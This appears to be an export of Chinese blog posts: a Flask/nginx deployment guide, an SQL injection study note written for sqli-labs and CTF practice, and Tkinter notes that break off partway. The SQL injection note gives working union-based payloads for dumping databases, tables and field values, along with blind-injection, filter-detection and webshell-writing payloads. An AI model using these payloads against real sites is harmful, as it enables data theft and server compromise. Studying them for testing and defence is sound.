<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进程数</span></span><br><span class="line"><span class="attr">workers</span> = <span class="number">3</span></span><br><span class="line"><span class="comment"># 监听本地的哪个端口</span></span><br><span class="line"><span class="attr">bind</span> = <span class="string">'127.0.0.1:8000'</span></span><br></pre></td></tr></table></figure>

<p><code>:wq</code>保存退出。</p>
<p>安装组件：</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">pip <span class="keyword">install</span> -r requirements.txt</span><br></pre></td></tr></table></figure>

<p>创建日志文件夹：</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> logs</span><br></pre></td></tr></table></figure>

<p>退出虚拟环境：</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">deactivate</span></span><br></pre></td></tr></table></figure>

<h1 id="Supervisor配置"><a href="#Supervisor配置" class="headerlink" title="Supervisor配置"></a>Supervisor配置</h1><p><strong>使用root用户：</strong></p>
<p>配置supervisor：</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">apt install supervisor</span><br><span class="line"><span class="keyword">cd</span> /etc/supervisor/<span class="keyword">conf</span>.d</span><br><span class="line"><span class="keyword">vim</span> blog.<span class="keyword">conf</span></span><br></pre></td></tr></table></figure>

<p>vim写入：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进程的名字，取一个以后自己一眼知道是什么的名字。</span></span><br><span class="line"><span class="section">[program:blog]</span></span><br><span class="line"><span class="comment"># 定义命令。你只要注意后面的目录对就行。特别注意「run:app」的run，这个名字是你网站应用的文件名。如果是run.py，就写run。</span></span><br><span class="line"><span class="attr">command</span>=/home/www/blog/venv/bin/gunicorn run:app -c /home/www/blog/gunicorn.conf</span><br><span class="line"><span class="comment"># 网站目录</span></span><br><span class="line"><span class="attr">directory</span>=/home/www/blog</span><br><span class="line"><span class="comment"># 进程所属用户。</span></span><br><span class="line"><span class="attr">user</span>=www</span><br><span class="line"><span class="comment"># 自动重启设置。</span></span><br><span class="line"><span class="attr">autostart</span>=<span class="literal">true</span></span><br><span class="line"><span class="attr">autorestart</span>=<span class="literal">true</span></span><br><span class="line"><span class="comment"># 日志存放位置。</span></span><br><span class="line"><span class="attr">stdout_logfile</span>=/home/www/blog/logs/gunicorn_supervisor.log</span><br><span class="line"><span class="comment"># 设置环境变量。这里这行的意思是：设置环境变量MODE的值为UAT。请根据自己的需要配置，如没有需要这行可以删除。</span></span><br><span class="line"><span class="attr">environment</span> = MODE=<span class="string">"UAT"</span></span><br></pre></td></tr></table></figure>

<p><code>:wq</code>保存。</p>
<p><strong>回到supervisor的目录：</strong></p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cd</span> <span class="string">/etc/supervisor</span></span><br></pre></td></tr></table></figure>

<p>启动supervisor：</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">service supervisor <span class="literal">start</span></span><br></pre></td></tr></table></figure>

<p>加载配置：</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">sudo</span> <span class="string">supervisorctl reread</span></span><br><span class="line"><span class="attr">supervisorctl</span> <span class="string">update</span></span><br><span class="line"><span class="attr">sudo</span> <span class="string">supervisorctl start blog</span></span><br></pre></td></tr></table></figure>

<h1 id="Nginx配置"><a href="#Nginx配置" class="headerlink" title="Nginx配置"></a>Nginx配置</h1><p>开始配置nginx：</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">apt</span> <span class="string">install nginx</span></span><br><span class="line"><span class="attr">cd</span> <span class="string">/etc/nginx/sites-avaliable</span></span><br><span class="line"><span class="attr">vim</span> <span class="string">blog</span></span><br></pre></td></tr></table></figure>

<p>输入对于blog的配置：</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">server</span> <span class="string">&#123;  </span></span><br><span class="line">        <span class="attr">listen</span>   <span class="string">80;  </span></span><br><span class="line">        <span class="attr">server_name</span> <span class="string">www.xxx.com xxx.com;</span></span><br><span class="line"></span><br><span class="line">        <span class="attr">root</span> <span class="string">/home/www/blog;</span></span><br><span class="line">        <span class="attr">access_log</span> <span class="string">/home/www/blog/logs/access.log;</span></span><br><span class="line">        <span class="attr">error_log</span> <span class="string">/home/www/blog/logs/access.log;</span></span><br><span class="line"></span><br><span class="line">        <span class="attr">location</span> <span class="string">/ &#123;  </span></span><br><span class="line">            <span class="attr">proxy_set_header</span> <span class="string">X-Forward-For $proxy_add_x_forwarded_for;  </span></span><br><span class="line">            <span class="attr">proxy_set_header</span> <span class="string">Host $http_host;  </span></span><br><span class="line">            <span class="attr">proxy_redirect</span> <span class="string">off;  </span></span><br><span class="line">            <span class="attr">if</span> <span class="string">(!-f $request_filename) &#123;  </span></span><br><span class="line">                <span class="attr">proxy_pass</span> <span class="string">http://127.0.0.1:8000;  </span></span><br><span class="line">                <span class="meta">break;</span>  <span class="string"></span></span><br><span class="line">            <span class="meta">&#125;</span>  <span class="string"></span></span><br><span class="line">        <span class="meta">&#125;</span>  <span class="string"></span></span><br><span class="line">    <span class="attr">&#125;</span></span><br></pre></td></tr></table></figure>

<p><strong>检查并根据实际情况修改上面的server_name和root配置。</strong>检查监听端口和上面设置是否一致。<code>:wq</code>保存。</p>
<p>下面链接配置文件到sites-enabled:</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cd <span class="regexp">/etc/</span>nginx<span class="regexp">/sites-enabled/</span></span><br><span class="line">ln -s <span class="regexp">/etc/</span>nginx<span class="regexp">/sites-avaliable/</span>blog .<span class="regexp">/blog</span></span><br></pre></td></tr></table></figure>

<p>重启nginx：</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">service nginx restart</span></span><br></pre></td></tr></table></figure>

<p>阿里云安全组配置允许入方向80端口。完成。</p>
<p>键入域名或ip即可访问。</p>
]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入笔记</title>
    <url>/2020/06/01/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>Sql 注入是渗透测试中的一个重要部分。这里是一些 Sql 注入相关内容的总结和整理，留待以后查阅。</p>
<a id="more"></a>

<h2 id="Sql-注入的本质理解"><a href="#Sql-注入的本质理解" class="headerlink" title="Sql 注入的本质理解"></a>Sql 注入的本质理解</h2><p> Sql 注入的本质是利用网页中可控的注入点，动态构造后端的 Sql 语句，达到注入攻击的目的。（从客户端提交特殊的代码，从而收集程序及服务器的信息，从而获取想得到的资料。）</p>
<h2 id="Sql-注入的一般步骤"><a href="#Sql-注入的一般步骤" class="headerlink" title="Sql 注入的一般步骤"></a>Sql 注入的一般步骤</h2><ol>
<li>判断环境、寻找注入点、判断数据库类型。</li>
<li>根据注入参数类型，在脑海中构造大致的 Sql 语句。<ul>
<li>数字型：<code>Select * from 表名 where id=1 and [查询条件]</code> （注入参数为<code>id=1 and [查询条件]</code>）</li>
<li>字符型：<code>select * from 表名 where class=&#39;a&#39; and [查询条件] and &#39;&#39;=&#39;&#39;</code>（注入参数为<code>class=a&#39; and [查询条件] and &#39;&#39;=&#39;</code>）</li>
<li>搜索型：SQL 语句原貌大致为：<code>Select * from 表名 where 字段 like &#39;%关键字%&#39;</code> ,生成语句可以是<code>Select * from 表名 where 字段 like &#39;%&#39; and [查询条件] and &#39;%&#39;=&#39;%&#39;</code> （注入参数为<code>keyword=&#39; and [查询条件] and &#39;%25&#39;=&#39;</code>）（语句中的 ‘%’ 意为模糊查询，%25 经 URL 解码后为 ‘%’ ）</li>
</ul>
</li>
<li>猜解表名，列名，查找需要的数据。</li>
</ol>
<h2 id="Sql-注入点的判断"><a href="#Sql-注入点的判断" class="headerlink" title="Sql 注入点的判断"></a>Sql 注入点的判断</h2><h3 id="常见注入点"><a href="#常见注入点" class="headerlink" title="常见注入点"></a>常见注入点</h3><ul>
<li><p>GET 请求：在 URL 中发送参数。</p>
</li>
<li><p>POST 请求：数据被包含在请求体中。</p>
</li>
<li><p><strong>其它类型的注入数据：例如 HTTP 请求头等</strong></p>
<p>常见 http 可能被污染的参数:</p>
<ul>
<li>User-agent 浏览器版本 （少）</li>
<li>Referer 来源（少）</li>
<li>X-Forwarded-For 获取 ip（多）</li>
<li>client_ip 获取 ip（多）</li>
<li>cookie 获取 cookie 值（多）</li>
</ul>
</li>
</ul>
<h3 id="注入点判断方法"><a href="#注入点判断方法" class="headerlink" title="注入点判断方法"></a>注入点判断方法</h3><h4 id="返回错误信息"><a href="#返回错误信息" class="headerlink" title="返回错误信息"></a>返回错误信息</h4><p><strong>单引号判断法：</strong></p>
<p>在参数后面加上单引号并观察。<strong>如果页面返回错误，则存在 Sql 注入</strong>，即存在可被我们控制的动态构造部分。 原因是<strong>无论字符型还是整型都会因为单引号个数不匹配而报错</strong>。出现单引号个数不匹配说明某部分后端代码用我们提供的多一个引号的参数动态构造后多出了一个引号。同时，这种方法在页面出现错误信息的时候也可以判断数据库类型。</p>
<p><em>实例：</em></p>
<blockquote>
<p>在网站首页上，有名为“IE 不能打开新窗口的多种解决方法”的链接，地址为：<code>http://www.mytest.com/showdetail.asp?id=49</code>，我们在这个地址后面加上单引号’，服务器返回下面的错误提示：</p>
<blockquote>
<p>Microsoft JET Database Engine 错误 ‘80040e14’</p>
<p>字符串的语法错误 在查询表达式 ‘ID=49’’ 中。<br>/showdetail.asp，行 8</p>
</blockquote>
<p><strong>从这个错误提示我们能看出：</strong></p>
<ul>
<li>网站使用的是 Access 数据库，通过 JET 引擎连接数据库，而不是通过 ODBC。 //引擎及数据库信息</li>
<li>程序没有判断客户端提交的数据是否符合程序要求。 //对注入的可能性的判断</li>
<li>该 SQL 语句所查询的表中有一名为 ID 的字段。 //对字段的判断</li>
</ul>
</blockquote>
<h4 id="不返回错误信息"><a href="#不返回错误信息" class="headerlink" title="不返回错误信息"></a>不返回错误信息</h4><p>上述的单引号判断法简便易用，但并不适用于所有的情况，具体解释如下：</p>
<blockquote>
<p>1.不一定每台服务器的 IIS 都返回具体错误提示给客户端，如果程序中加了 cint(参数)之类语句的话，Sql 注入是不会成功的，但服务器同样会报错，具体提示信息为处理 URL 时服务器上出错。请和系统管理员联络。 2.部分对 Sql 注入有一点了解的程序员，认为只要把单引号过滤掉就安全了，这种情况不为少数，如果你用单引号测试，是测不到注入点的，所以进一步的判断是有必要的。</p>
</blockquote>
<p>此时一个经典的方法是<strong>借助 and 和 or 来判断：</strong></p>
<ul>
<li><p>数字型：当输入的参数 <strong>x</strong> 为<strong>整型</strong>时，通常 php 文件中 Sql 语句类型大致如下： <code>select * from &lt;表名&gt; where id = x</code> 。 这种类型可以先用 <code>and 1=1</code> 和 <code>and 1=2</code> 来做尝试：</p>
<p><em>实例：</em></p>
<blockquote>
<p>① <code>http://www.mytest.com/showdetail.asp?id=49</code><br>② <code>http://www.mytest.com/showdetail.asp?id=49 and 1=1</code><br>③ <code>http://www.mytest.com/showdetail.asp?id=49 and 1=2</code></p>
<p><strong>可以注入的表现：</strong><br>① 正常显示<br>② 正常显示，内容基本与 ① 相同。</p>
<p>后台执行 Sql 语句大致为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> &lt;表名&gt; <span class="keyword">where</span> <span class="keyword">id</span> = x <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>没有语法错误且逻辑判断为正确，所以返回正常。</p>
<p>③ 提示 BOF 或 EOF（程序没做任何判断时）、或提示找不到记录（判断了 rs.eof 时）、或显示内容为空（程序加了 on error resume next）</p>
<p>后台执行 Sql 语句大致为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> &lt;表名&gt; <span class="keyword">where</span> <span class="keyword">id</span> = x <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>没有语法错误但是逻辑判断为假，所以返回错误。</p>
<p><strong>不可以注入的表现：</strong></p>
<p>① 同样正常显示，② 和 ③ 一般都会有程序定义的错误提示，或提示类型转换时出错。</p>
</blockquote>
<p>或者我们也可以先把参数改为很大的数或负数，要让它查询不到数据，再在最后加上 or 1=1 就成功返回了数据，这是因为 1=1 为真，不管前面是不是假，数据都会返回。当 or 1=2 时，因为 1=2 为假，前后都为假，最终也是假，数据就不会返回了。</p>
</li>
<li><p>字符型：当输入的参数 <strong>x 为字符型</strong>时，通常 php 文件中 SQL 语句类型大致如下： <code>select * from &lt;表名&gt; where id = &#39;x&#39;</code> 这种类型我们同样可以使用 <code>and &#39;1&#39;=&#39;1</code> 和 <code>and &#39;1&#39;=&#39;2</code>来判断：</p>
<blockquote>
<p>① URL 地址中输入 <code>http://xxx/abc.php?id= x&#39; and &#39;1&#39;=&#39;1</code> 页面运行正常，继续进行下一步。</p>
<p>② URL 地址中输入 <code>http://xxx/abc.php?id= x&#39; and &#39;1&#39;=&#39;2</code> 页面运行错误，则说明此 Sql 注入为字符型注入。</p>
</blockquote>
</li>
<li><p>除此之外还有搜索型注入，等做到相关题目再行补充。</p>
</li>
</ul>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="数据库类型判断"><a href="#数据库类型判断" class="headerlink" title="数据库类型判断"></a>数据库类型判断</h3><h4 id="通过网站脚本类型判断"><a href="#通过网站脚本类型判断" class="headerlink" title="通过网站脚本类型判断"></a>通过网站脚本类型判断</h4><ul>
<li>PHP -&gt; Oracle、MySQL</li>
<li>JSP -&gt; Oracle、MySQL</li>
<li>ASP/.NET -&gt; SQL Server</li>
</ul>
<h4 id="通过错误信息判断"><a href="#通过错误信息判断" class="headerlink" title="通过错误信息判断"></a>通过错误信息判断</h4><ul>
<li>MySQL -&gt; <code>error:You have an error in your SQL syntax; check themanual that corresponds to your MySQL server version</code></li>
<li>Oracle -&gt; <code>Microsoft OLE DB Provider for ODBC Drivers 错误</code></li>
</ul>
<h4 id="通过数字函数判断"><a href="#通过数字函数判断" class="headerlink" title="通过数字函数判断"></a>通过数字函数判断</h4><ul>
<li>SQL Server -&gt; <code>@@pack_received、@@rowcount</code></li>
<li>MySQL -&gt; <code>connection_id()、last_insert_id() 、 row_count()</code></li>
<li>Oracle -&gt; <code>BITAND(1,1)</code></li>
<li>PostgreSQL -&gt; <code>select EXTRACT(DOW FROMNOW())</code></li>
</ul>
<h3 id="通过-UNION-语句提取数据"><a href="#通过-UNION-语句提取数据" class="headerlink" title="通过 UNION 语句提取数据"></a>通过 UNION 语句提取数据</h3><blockquote>
<p>UNION 操作符可以合并两条或多条 SELECT 语句的查询结果，基本语法如下：<br><code>select column1 column2 from table1 UNION select column1 column2 from table2</code></p>
</blockquote>
<p><strong>使用 UNION 语句需要满足的条件：</strong> 前后两个查询的列数及对应列的数据类型必须相等。</p>
<p><em>一般过程为：</em></p>
<h4 id="获得列数"><a href="#获得列数" class="headerlink" title="获得列数"></a>获得列数</h4><p>使用 <code>order by</code> 语句。最大且不报错的数值即为列数。</p>
<h4 id="获得回显点"><a href="#获得回显点" class="headerlink" title="获得回显点"></a>获得回显点</h4><p>使用 <code>union select</code> 语句，查看回显点。</p>
<p><em>使用例：</em> <code>?id=-1&#39; union select 1,2,3 %23</code></p>
<blockquote>
<p>说明：</p>
<p>先查询一个<strong>不存在的参数</strong>，本应该返回空的；<br>但是使用 UNION 查询，会输出后面的查询；<br>用<strong>数字去占位</strong>，所以能看到的数字就是回显点。</p>
</blockquote>
<h4 id="猜解数据库"><a href="#猜解数据库" class="headerlink" title="猜解数据库"></a>猜解数据库</h4><ul>
<li><p>数据库版本信息：</p>
<p><code>?id=&#39; union select 1, version(), 3 %23</code></p>
</li>
<li><p>当前数据库和用户：</p>
<p><code>?id=&#39; union select 1, database(), user() %23</code></p>
</li>
<li><p>所有数据库：</p>
<p><code>?id=&#39; union select 1, (select group_concat(schema_name) from information_schema.schemata), 3 %23</code></p>
</li>
<li><p>表名：</p>
<p><code>?id=&#39; union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=&#39;&lt;当前数据库名称&gt;&#39;), 3 %23</code></p>
</li>
<li><p>列名：</p>
<p><code>?id=&#39; union select 1, (select group_concat(column_name) from information_schema.columns where table_schema=&#39;&lt;当前数据库名称&gt;&#39; and table_name=&#39;&lt;当前表名&gt;&#39;), 3 %23</code></p>
</li>
<li><p>字段值 ( 其中 separator 可选 ) ：</p>
<p><code>?id=&#39; union select 1,(select group_concat(&lt;查询到的列名&gt; separator &#39;;&#39;) from &lt;当前表名&gt;), 3 %23</code></p>
</li>
</ul>
<h4 id="获取哈希口令"><a href="#获取哈希口令" class="headerlink" title="获取哈希口令"></a>获取哈希口令</h4><blockquote>
<p>哈希口令是通过使用 PASSWORD() 函数计算的，具体算法取决于 MySQL 安装的版本。<br><code>select password(&#39;admin&#39;)</code><br>也可以通过在线解密网站进行解密。如 <a href="http://www.cmd5.com/" target="_blank" rel="noopener">CMD5</a></p>
</blockquote>
<h4 id="写入-Webshell"><a href="#写入-Webshell" class="headerlink" title="写入 Webshell"></a>写入 Webshell</h4><blockquote>
<p>需要得到网站的绝对路径，数据库管理系统有向服务器文件系统写文件的权限。<br><code>?id=1&#39; union select &quot;&quot; into outfile &quot;D:\\XXX\\conn.php&quot;%23</code></p>
</blockquote>
<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>上述是用有回显注入举例说明 Sql 注入的基本过程的例子，盲注过程与此类似，只不过没有回显<br>需要逐位尝试。</p>
<p>只要回显中有固定字符串，都可使用盲注脚本。</p>
<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p><code>id=1 union select 1，if(SUBSTRING(user(),1,4)=&#39;root&#39;,sleep(5),1),3</code>（substring 函数的作用是将 user()从第一位字母到第四位字母截断。这段参数的注入逻辑是，user()的第一位到第四位如果为’root’，则页面等待 5 秒，否则结果为 1。）</p>
<p>脚本：待补充</p>
<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>脚本：待补充</p>
<h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><h3 id="检测过滤的字符串"><a href="#检测过滤的字符串" class="headerlink" title="检测过滤的字符串"></a>检测过滤的字符串</h3><p>可用异或注入检测过滤的字符串。异或即两个条件同真或同假即为假，两条件一真一假则为真。</p>
<p>样例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39;^(length(&#39;and&#39;)!&#x3D;0)--+</span><br></pre></td></tr></table></figure>

<p>此样例可用来判断 and 是否被过滤。若满足异或条件则返回 id=0 对应的值，即被过滤。不满足异或条件则返回 id=1 对应的值，即未被过滤。也可以用<code>xor</code>来构造语句。</p>
<p>不过，有的时候需要使用 <code>=</code> 而不是 <code>!=</code> 来判断。例如，WAF 过滤了 or，那么 order 的 length 就为 3，虽然不等于 0，但是没有 order 的功能了。</p>
<h2 id="Sql-labs中的技巧总结"><a href="#Sql-labs中的技巧总结" class="headerlink" title="Sql-labs中的技巧总结"></a>Sql-labs中的技巧总结</h2><h3 id="Less-5-双查询注入（Double-injection）"><a href="#Less-5-双查询注入（Double-injection）" class="headerlink" title="Less-5 双查询注入（Double injection）"></a>Less-5 双查询注入（Double injection）</h3><p>参考：<a href="https://bbs.ichunqiu.com/thread-27209-1-43.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-27209-1-43.html</a></p>
<ul>
<li>COUNT() 函数返回匹配指定条件的行数。</li>
<li>RAND() 函数，用于产生 0 至 1 之间的随机数</li>
<li>ORDER BY 语句，针对某列数据进行排序，可接列名或数字，可接rand()函数表示随机排序。</li>
<li>FLOOR() 函数，向下取整。</li>
<li>GROUP BY 语句用于结合/分组。后接根据哪个字段进行分组。</li>
<li>表示表中的列可用 ‘.’ 符号连接，形如：users.id</li>
</ul>
<p>双重查询注入其实就是一个select语句中嵌套另一个select语句。如 <code>select count (select database())</code> ,结果为1。</p>
<p>使用group by子句结合rand()函数以及像<code>count（*）</code>这样的聚合函数，在SQL查询时会出现错误，这种错误是随机产生的，这就产生了双重查询注入。使用floor()函数只是为了将查询结果分类。<br>使用如下SQL语句，发现多查询几次会爆出duplicate entry的错误，且将我们需要的信息都爆出来了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a;</span><br></pre></td></tr></table></figure>

<h3 id="Less-7-写入文件（Outfile）"><a href="#Less-7-写入文件（Outfile）" class="headerlink" title="Less-7 写入文件（Outfile）"></a>Less-7 写入文件（Outfile）</h3><p>参考：<a href="https://www.jianshu.com/p/1f97795443ce" target="_blank" rel="noopener">https://www.jianshu.com/p/1f97795443ce</a></p>
<ul>
<li>SELECT … INTO OUTFILE ‘&lt;路径&gt;’</li>
<li>写入路径为服务器中的某一路径，而不是客户端路径</li>
<li>会有权限限制，出现写不进去的情况（–secure-file-priv）</li>
<li>可以往里写🐎，得shell连菜刀，狂喜（x</li>
</ul>
<h3 id="Less-8-布尔盲注（Blind-Boolean）"><a href="#Less-8-布尔盲注（Blind-Boolean）" class="headerlink" title="Less-8 布尔盲注（Blind-Boolean）"></a>Less-8 布尔盲注（Blind-Boolean）</h3><p>参考：</p>
<h2 id="用Sqlmap过一遍Sql-labs"><a href="#用Sqlmap过一遍Sql-labs" class="headerlink" title="用Sqlmap过一遍Sql-labs"></a>用Sqlmap过一遍Sql-labs</h2><h2 id="防御相关"><a href="#防御相关" class="headerlink" title="防御相关"></a>防御相关</h2><p> 目前还没什么概念，等以后再补充。</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Tkinter学习笔记</title>
    <url>/2020/06/16/Tkinter%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>简单的Python GUI… 要想强大一点还是去用PyQt了。</p>
<a id="more"></a>

<h1 id="使用逻辑"><a href="#使用逻辑" class="headerlink" title="使用逻辑"></a>使用逻辑</h1><ol>
<li><p>import tkinter。</p>
</li>
<li><p>实例化窗口对象。例如</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">window</span> = tkinter.Tk()</span><br></pre></td></tr></table></figure></li>
<li><p>对刚才实例化的窗口对象进行设置，如</p>
<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line"><span class="meta">window</span>.<span class="meta">title</span>(<span class="string">'This is a titie.'</span>)</span><br><span class="line"><span class="meta">window</span>.geometry(<span class="string">'200x100'</span>)   # 中间的符号是英文字母<span class="string">'x'</span></span><br></pre></td></tr></table></figure></li>
<li><p>实例化各窗口内的控件并将其放置在窗口的某个位置，例如</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 实例化标签对象, 注意：方法的首字母大写</span></span><br><span class="line">label = tkinter.Label(window, <span class="attribute">text</span>=<span class="string">''</span>, <span class="attribute">textvariable</span>=..., font=(<span class="string">'Consolas'</span>, 20, <span class="string">'bold'</span>), <span class="attribute">width</span>=150, <span class="attribute">height</span>=100)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 放置在窗口的某个位置</span></span><br><span class="line">label.pack()</span><br></pre></td></tr></table></figure></li>
<li><p>令主窗口自我刷新，完成GUI的交互作用，如</p>
<figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.mainloop()</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="简单控件的使用方法小结"><a href="#简单控件的使用方法小结" class="headerlink" title="简单控件的使用方法小结"></a>简单控件的使用方法小结</h1><ul>
<li><p>Label控件</p>
<p>Label控件是tkinter中的标签控件。用于显示文本和图像。语法格式如下：</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">label = tkinter.<span class="constructor">Label( <span class="params">master</span>, <span class="params">options</span>, <span class="operator">...</span>)</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>master: 框架的父容器，可理解为某个窗口。</p>
</li>
<li><p>options: 可设置的属性。这些选项可以用键值对的形式设置，并以逗号分隔。</p>
<p>以下是可选项清单：</p>
<table>
<thead>
<tr>
<th align="center">序号</th>
<th align="center">可选项 &amp; 描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">**anchor **    文本或图像在背景内容区的位置，默认为 center，可选值为（n,s,w,e,ne,nw,sw,se,center）eswn 是东南西北英文的首字母，表示：上北下南左西右东。</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center"><strong>bg</strong>  标签背景颜色</td>
</tr>
<tr>
<td align="center">4</td>
<td align="center"><strong>bd</strong>  标签的大小，默认为 2 个像素</td>
</tr>
<tr>
<td align="center">4</td>
<td align="center"><strong>bitmap</strong>  指定标签上的位图，如果指定了图片，则该选项忽略</td>
</tr>
<tr>
<td align="center">5</td>
<td align="center">**cursor ** 鼠标移动到标签时，光标的形状，可以设置为 arrow, circle, cross, plus 等。</td>
</tr>
<tr>
<td align="center">6</td>
<td align="center">**font ** 设置字体。</td>
</tr>
<tr>
<td align="center">7</td>
<td align="center">**fg ** 设置前景色。</td>
</tr>
<tr>
<td align="center">8</td>
<td align="center">**height ** 标签的高度，默认值是 0。</td>
</tr>
<tr>
<td align="center">9</td>
<td align="center">**image ** 设置标签图像。</td>
</tr>
<tr>
<td align="center">10</td>
<td align="center"><strong>justify</strong> 定义对齐方式，可选值有：LEFT,RIGHT,CENTER，默认为 CENTER。</td>
</tr>
<tr>
<td align="center">11</td>
<td align="center"><strong>padx</strong>  x轴间距，以像素计，默认 1。</td>
</tr>
<tr>
<td align="center">12</td>
<td align="center"><strong>pady</strong>  y轴间距，以像素计，默认 1。</td>
</tr>
<tr>
<td align="center">13</td>
<td align="center"><strong>relief</strong>  边框样式，可选的有：FLAT、SUNKEN、RAISED、GROOVE、RIDGE。默认为 FLAT。</td>
</tr>
<tr>
<td align="center"><strong>14</strong></td>
<td align="center">**text ** 设置文本，可以包含换行符(\n)。</td>
</tr>
<tr>
<td align="center"><strong>15</strong></td>
<td align="center"><strong>textvariable</strong>  标签显示 Tkinter 变量，StringVar。如果变量被修改，标签文本将自动更新。</td>
</tr>
<tr>
<td align="center">16</td>
<td align="center">**underline ** 设置下划线，默认 -1，如果设置 1，则是从第二个字符开始画下划线。</td>
</tr>
<tr>
<td align="center">17</td>
<td align="center">**width ** 设置标签宽度，默认值是 0，自动计算，单位以像素计。</td>
</tr>
<tr>
<td align="center">10</td>
<td align="center">**wraplength ** 设置标签文本为多少行显示，默认为 0。</td>
</tr>
</tbody></table>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>Button控件</p>
<p>Button控件是tkinter中的按钮控件。用于在程序中显示按钮。按钮可与一个command函数进行关联，在按下按钮时执行command函数。语法格式如下：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">button = tkinter.Button ( master, <span class="attribute">option</span>=value, <span class="built_in">..</span>. )</span><br></pre></td></tr></table></figure>

<p>以下是可选项清单：</p>
<table>
<thead>
<tr>
<th align="center">序号</th>
<th align="center">可选项 &amp; 描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center"><strong>activebackground</strong>  当鼠标放上去时，按钮的背景色</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">**activeforeground ** 当鼠标放上去时，按钮的前景色</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">**bd ** 按钮边框的大小，默认为 2 个像素</td>
</tr>
<tr>
<td align="center">4</td>
<td align="center">**bg ** 按钮的背景色</td>
</tr>
<tr>
<td align="center"><strong>5</strong></td>
<td align="center"><strong>command</strong>  按钮关联的函数，当按钮被点击时，执行该函数</td>
</tr>
<tr>
<td align="center">6</td>
<td align="center">**fg ** 按钮的前景色（按钮文本的颜色）</td>
</tr>
<tr>
<td align="center">7</td>
<td align="center">**font ** 文本字体</td>
</tr>
<tr>
<td align="center">8</td>
<td align="center">**height ** 按钮的高度</td>
</tr>
<tr>
<td align="center">9</td>
<td align="center">**highlightcolor ** 要高亮的颜色</td>
</tr>
<tr>
<td align="center">10</td>
<td align="center"><strong>image</strong>  按钮上要显示的图片</td>
</tr>
<tr>
<td align="center">11</td>
<td align="center">**justify ** 显示多行文本的时候,设置不同行之间的对齐方式，可选项包括LEFT, RIGHT, CENTER</td>
</tr>
<tr>
<td align="center">12</td>
<td align="center">**padx **  按钮在x轴方向上的内边距(padding)，是指按钮的内容与按钮边缘的距离</td>
</tr>
<tr>
<td align="center">13</td>
<td align="center">**pady ** 按钮在y轴方向上的内边距(padding)</td>
</tr>
<tr>
<td align="center">14</td>
<td align="center">**relief ** 边框样式，设置控件3D效果，可选的有：FLAT、SUNKEN、RAISED、GROOVE、RIDGE。默认为 FLAT。</td>
</tr>
<tr>
<td align="center">15</td>
<td align="center">**state ** 设置按钮组件状态,可选的有NORMAL、ACTIVE、 DISABLED。默认 NORMAL。</td>
</tr>
<tr>
<td align="center">16</td>
<td align="center">**underline ** 下划线。默认按钮上的文本都不带下划线。取值就是带下划线的字符串索引，为 0 时，第一个字符带下划线，为 1 时，前两个字符带下划线，以此类推</td>
</tr>
<tr>
<td align="center">17</td>
